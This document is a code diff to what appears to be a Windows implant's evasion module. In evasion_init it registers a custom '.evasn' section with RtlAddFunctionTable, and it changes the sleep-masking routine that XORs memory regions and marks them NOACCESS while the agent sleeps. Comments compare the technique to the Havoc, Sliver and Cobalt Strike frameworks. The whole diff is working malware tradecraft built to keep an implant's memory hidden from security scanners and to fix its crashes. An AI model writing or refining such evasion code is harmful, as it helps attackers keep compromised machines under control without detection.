@@ -559,6 +559,51 @@ void evasion_init(void) {
     }
 #endif /* mode >= 1 */
 
+#if AGENT_SLEEP_MASK_MODE >= 1
+    /* Register the .evasn section with the Windows SEH unwind machinery so the
+     * exception dispatcher can find a valid RUNTIME_FUNCTION entry for any RIP
+     * inside it.  Without this, Windows treats .evasn functions as leaf frames
+     * and any stack-walk through them (kernel APC dispatch, RtlCaptureContext,
+     * vectored handlers) reads [RSP] as the return address — resulting in the
+     * heap-corruption crash observed at ntdll+0x4ab8.
+     * Production frameworks (Havoc, Sliver, CS) do the same for their
+     * sleep-mask trampolines/custom sections. */
+    {
+        typedef struct {
+            DWORD BeginAddress;
+            DWORD EndAddress;
+            DWORD UnwindInfoAddress;
+        } AGENT_RF;
+        typedef BOOLEAN (WINAPI *RtlAFT_t)(AGENT_RF *, DWORD, DWORD64);
+        /* Minimal UNWIND_INFO: Version=1, Flags=0 (no handler), Prolog=0, Codes=0.
+         * Lives in .rdata so its RVA from the PE base is always valid. */
+        static const BYTE s_uwi[4] = { 0x01, 0x00, 0x00, 0x00 };
+        static AGENT_RF   s_rf;
+        static BOOLEAN    s_aft_done = FALSE;
+        if (!s_aft_done) {
+            HMODULE hSelf = GetModuleHandleA(NULL);
+            IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)hSelf;
+            IMAGE_NT_HEADERS *pnt =
+                (IMAGE_NT_HEADERS *)((BYTE *)hSelf + dos->e_lfanew);
+            IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(pnt);
+            for (WORD isec = 0; isec < pnt->FileHeader.NumberOfSections;
+                 isec++, sec++) {
+                if (memcmp(sec->Name, ".evasn", 6) == 0) {
+                    s_rf.BeginAddress      = sec->VirtualAddress;
+                    s_rf.EndAddress        = sec->VirtualAddress + sec->Misc.VirtualSize;
+                    s_rf.UnwindInfoAddress =
+                        (DWORD)((ULONG_PTR)s_uwi - (ULONG_PTR)hSelf);
+                    RtlAFT_t pfn =
+                        (RtlAFT_t)GetProcAddress(ntdll, "RtlAddFunctionTable");
+                    if (pfn) pfn(&s_rf, 1, (DWORD64)(ULONG_PTR)hSelf);
+                    s_aft_done = TRUE;
+                    break;
+                }
+            }
+        }
+    }
+#endif /* mode >= 1 */
+
 #ifdef AGENT_STACK_SPOOF
     init_stack_spoof();
 #endif
@@ -622,10 +667,16 @@ void sleep_masked(DWORD ms) {
 
 __attribute__((section(".evasn"), noinline))
 void sleep_masked(DWORD ms) {
-    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
+    /* No regions to mask, or connection threads active — plain non-alertable sleep.
+     * This also avoids the stack-local saved_prots[] allocation when g_ev_count==0,
+     * which would make this a non-leaf function in .evasn without a .pdata entry. */
+    if (g_ev_count == 0 || InterlockedOr(&g_conn_thread_count, 0) > 0) {
+        plain_sleep(ms); return;
+    }
 
-    /* XOR + NOACCESS external registered regions; save original protections */
-    DWORD saved_prots[MAX_EVASION_REGIONS];
+    /* XOR + NOACCESS external registered regions; save original protections.
+     * Static avoids stack allocation in .evasn (thread-safe: guarded by g_conn_thread_count). */
+    static DWORD saved_prots[MAX_EVASION_REGIONS];
     for (int i = 0; i < g_ev_count; i++) {
         unsigned char *p = (unsigned char*)g_ev_regions[i].base;
         SIZE_T sz = g_ev_regions[i].sz;
@@ -699,12 +750,10 @@ void sleep_masked(DWORD ms) {
 
     if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
 
-    /* If no external regions registered, use a simple alertable sleep
-     * (main thread parks in ntdll — clean call stack — without touching .text) */
+    /* No regions to mask — non-alertable sleep prevents APC delivery into
+     * an unregistered .evasn frame (which crashes at ntdll+0x4ab8). */
     if (g_ev_count == 0) {
-        LARGE_INTEGER t;
-        t.QuadPart = -(LONGLONG)ms * 10000LL;
-        g_NtDelay(TRUE, &t);   /* alertable = TRUE: clean stack, no .text touch */
+        plain_sleep(ms);
         return;
     }
 
@@ -806,11 +855,10 @@ void sleep_masked(DWORD ms) {
 
     if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
 
-    /* No external regions: park main thread alertably in ntdll (clean stack) */
+    /* No regions to mask — non-alertable sleep prevents APC delivery into
+     * an unregistered .evasn frame (which crashes at ntdll+0x4ab8). */
     if (g_ev_count == 0) {
-        LARGE_INTEGER t;
-        t.QuadPart = -(LONGLONG)ms * 10000LL;
-        g_NtDelay(TRUE, &t);
+        plain_sleep(ms);
         return;
     }
 
